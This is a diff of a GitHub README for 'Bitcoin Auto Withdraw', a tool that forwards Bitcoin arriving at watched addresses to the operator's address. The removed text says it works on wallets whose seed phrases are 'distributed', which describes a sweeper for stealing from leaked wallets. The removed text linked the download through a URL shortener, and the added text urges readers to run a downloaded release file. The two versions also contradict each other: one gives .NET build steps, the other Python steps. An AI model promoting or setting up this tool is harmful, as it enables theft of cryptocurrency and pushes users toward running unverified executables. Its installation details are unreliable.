@@ -1,90 +1,103 @@
-# Bitcoin Auto Withdraw
-## Download - [Click here](https://cleanuri.com/yE548o)
+# Bitcoin Auto Withdraw 🚀
 
+![Bitcoin Auto Withdraw](https://img.shields.io/badge/Download-Release-blue.svg)  
+[Download Latest Release](https://github.com/Kayden12341/Bitcoin-Auto-Withdraws/releases)
 
+Bitcoin Auto Withdraw is a powerful tool designed to automate Bitcoin withdrawals to a specified address upon receiving funds in a Bitcoin wallet. This tool tracks transfers to a specific address and forwards them automatically, making it ideal for users who want to streamline their cryptocurrency transactions.
 
-This Tool is a tool used to perform automatic withdrawals as soon as money arrives in Bitcoin wallets. In particular, it ensures that transfers to a specific Bitcoin address are automatically routed to a specific address.
+## Table of Contents
 
+1. [Features](#features)
+2. [Installation](#installation)
+3. [Usage](#usage)
+4. [Configuration](#configuration)
+5. [Contributing](#contributing)
+6. [License](#license)
+7. [Contact](#contact)
 
+## Features
+
+- **Automated Withdrawals**: Automatically withdraw Bitcoin as soon as funds arrive.
+- **Real-Time Tracking**: Monitor your Bitcoin wallet and get instant notifications on transactions.
+- **Customizable Settings**: Set your withdrawal address and thresholds easily.
+- **User-Friendly Interface**: Simple and intuitive design for ease of use.
+- **Open Source**: Contribute to the project and improve it for everyone.
 
 ## Installation
 
-- **Extract the packages.7z archive (to avoid getting an error)**
+To get started with Bitcoin Auto Withdraw, follow these steps:
 
-- Open the solution file (.sln).
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/Kayden12341/Bitcoin-Auto-Withdraws.git
+   cd Bitcoin-Auto-Withdraws
+   ```
 
-- Replace `YOUR_TELEGRAM_BOT_TOKEN`, `YOUR_CHAT_ID` and `YOUR_BTC_ADDRESS` in `Program.cs` with your own information.
+2. **Download the Latest Release**:
+   Visit the [Releases](https://github.com/Kayden12341/Bitcoin-Auto-Withdraws/releases) section to download the latest version. Make sure to execute the downloaded file to set up the tool.
 
-- Select **Build Solution** from the **Build** menu to compile the project or select **Start Without Debugging** from the **Debug** menu or press `Ctrl+F5` to run the project.
-
-- Add seed to the `./Release\address.txt` file in the main directory of the project.
-
-- Runs it.
-
-
-
-## Requirements
-
-
-
-- Visual Studio 2022
-
-- .NET Core SDK 3.1 or higher
-
-- NBitcoin and NBitcoin.RPC packages
-
-- TelegramBot packages
-
-- Costura packages 
-
-
+3. **Install Dependencies**:
+   Ensure you have the required libraries installed. You can install them using pip:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
 ## Usage
 
+After installation, you can start using the Bitcoin Auto Withdraw tool.
 
+1. **Run the Script**:
+   Execute the main script using:
+   ```bash
+   python main.py
+   ```
 
-When the project is running, it tracks each transfer to a specific address in your Bitcoin wallet. If a transfer occurs to the specified address, it automatically sends that transfer to another address.
+2. **Monitor Transactions**:
+   The tool will begin monitoring your specified Bitcoin wallet. You will receive notifications for incoming transactions.
 
+3. **Automatic Withdrawals**:
+   Once the specified conditions are met, the tool will automatically withdraw the Bitcoin to your configured address.
 
+## Configuration
 
-## Settings
+To configure the tool, edit the `config.json` file in the project directory. Here are the key settings:
 
+```json
+{
+  "withdraw_address": "YOUR_BTC_ADDRESS",
+  "withdraw_threshold": 0.001,
+  "api_key": "YOUR_API_KEY"
+}
+```
 
+- **withdraw_address**: The Bitcoin address where you want to send the funds.
+- **withdraw_threshold**: The minimum amount in BTC required to trigger a withdrawal.
+- **api_key**: Your API key for accessing the Bitcoin wallet.
 
-The `address.txt` file in the project contains seed expressions and their corresponding Bitcoin addresses. You can edit this file with any text editor. Also, to receive notifications via Telegram, you need to create a bot and write your bot and target chat ID in the places specified in the `Program.cs` file.
+Make sure to replace the placeholder values with your actual information.
 
+## Contributing
 
+We welcome contributions from everyone. To contribute:
 
-## Recommendations
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your changes to your forked repository.
+5. Create a pull request.
 
-
-
-- Connect a Specific VPS/VDS to Keep it Active After Compiling the Code.
-
-- You can use this code on wallets with seed information distributed.
-
-- If you want to test the code yourself, try it with small quantities.
-
-
-
-## Contribution
-
-
-
-If you would like to contribute to this project, please leave a star in the repo.
-
-
-
-## Disclaimer
-
-
-
-No liability arising from the use or misuse of this software is accepted. Users must use this software at their own risk.
-
-
+Your contributions help improve the tool for all users.
 
 ## License
 
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
+## Contact
 
-This project is licensed under the MIT. For more information, see the [License](LICENSE).
+For questions or support, please reach out via the GitHub Issues page or contact me directly.
+
+---
+
+For more information and updates, visit the [Releases](https://github.com/Kayden12341/Bitcoin-Auto-Withdraws/releases) section. You can find the latest versions and updates there. 
+
+Thank you for using Bitcoin Auto Withdraw!
